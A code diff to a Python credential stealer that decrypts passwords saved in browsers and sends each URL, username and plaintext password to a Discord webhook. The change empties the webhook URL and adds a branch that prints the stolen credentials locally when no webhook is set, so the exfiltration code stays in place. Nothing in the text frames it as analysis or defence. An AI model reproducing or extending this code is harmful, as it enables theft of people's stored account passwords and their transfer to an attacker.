@@ -6,7 +6,7 @@ from Crypto.Cipher import AES
 import os
 import requests
 
-webhook_url = "https://discord.com/api/webhooks/[....]"
+webhook_url = ""
 
 def decrypt_password(encrypted_password, key):
     try:
@@ -31,12 +31,15 @@ def extract_passwords(browser_name, local_state_path, login_data_path):
 
         for origin_url, username, encrypted_password in cursor.fetchall():
             password = decrypt_password(encrypted_password, key)
-            payload = {
-                "content": f"[{browser_name}] Extracted Data:\nURL: {origin_url}\nUsername: {username}\nPassword: {password}"
-            }
-            response = requests.post(webhook_url, json=payload)
-            if response.status_code != 204:
-                print(f"Failed to export data: {response.status_code}, {response.text}")
+            output = f"[{browser_name}] Extracted Data:\nURL: {origin_url}\nUsername: {username}\nPassword: {password}"
+
+            if webhook_url:
+                payload = {"content": output}
+                response = requests.post(webhook_url, json=payload)
+                if response.status_code != 204:
+                    print(f"Failed to export data: {response.status_code}, {response.text}")
+            else:
+                print(output)
 
         conn.close()
     except Exception as e:
